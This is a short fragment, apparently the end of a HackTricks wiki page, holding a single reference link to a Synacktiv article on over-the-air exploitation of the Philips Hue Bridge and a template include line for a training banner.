- [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
